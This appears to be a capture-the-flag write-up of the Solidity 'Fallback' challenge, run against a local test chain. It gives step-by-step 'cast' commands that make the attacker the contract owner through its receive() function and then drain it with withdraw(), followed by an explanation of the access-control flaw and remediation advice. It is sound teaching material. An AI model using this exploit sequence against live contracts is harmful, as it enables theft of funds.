Objective

Bypass access-control mechanisms protecting the Fallback.sol contract, force an arbitrary state modification to hijack the master owner address variable, and completely drain the balance via unauthorized liquidity exfiltration.

## Exploitation Commands (PoC)
Bash

# Phase 1: Seed the ledger by contributing 1 wei to satisfy tracking mappings
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "contribute()" --value 1 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Phase 2: Trigger the fallback backdoor by sending raw value directly to the address
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 --value 1 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Phase 3: Verify administrative privilege elevation (Owner should be 0xf39f...)
cast call 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "owner()(address)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

# Phase 4: Execute unauthorized withdrawal payload to drain pooled capital
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "withdraw()" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

## Summary of Findings

The contract possessed a Critical Broken Access Control flaw residing within the native unnamed fallback function receive(). The code implicitly updated critical contract parameters based purely on basic validation logic gates:
Solidity

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}

Because an attacker can manipulate the contributions array for negligible cost via the public contribute() function, they can intentionally fulfill the requirements of the fallback statement, causing the contract to overwrite its true owner with the attacker's wallet address.

## Lessons Learned & Remediation

    Implicit State Corruption: Fallback methods (receive() / fallback()) should be minimized and must never process critical state parameter reassignments like administrative or ownership shifts.

    Remediation: Privilege reassignments should always map to explicit, named administrative functions wrapped inside robust access-control modifiers (such as OpenZeppelin's Ownable modifier pattern via onlyOwner).
